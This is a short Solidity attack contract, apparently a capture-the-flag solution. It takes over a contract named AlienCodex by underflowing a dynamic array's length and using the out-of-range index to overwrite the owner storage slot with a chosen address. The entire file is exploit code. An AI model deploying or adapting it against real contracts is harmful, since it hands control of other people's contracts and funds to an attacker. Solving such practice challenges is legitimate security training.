// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IAlienCodex {
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract MyAlienCodexAttack {
    constructor(address alienAddress, address newOwner) {
        IAlienCodex alien = IAlienCodex(alienAddress);
        alien.makeContact();
        alien.retract(); //underflow array length makes it equals to type(uint256).max

        uint256 i = type(uint256).max - uint256(keccak256(abi.encodePacked(uint256(1))));

        alien.revise(i + 1, bytes32(uint256(uint160(newOwner))));
    }
}
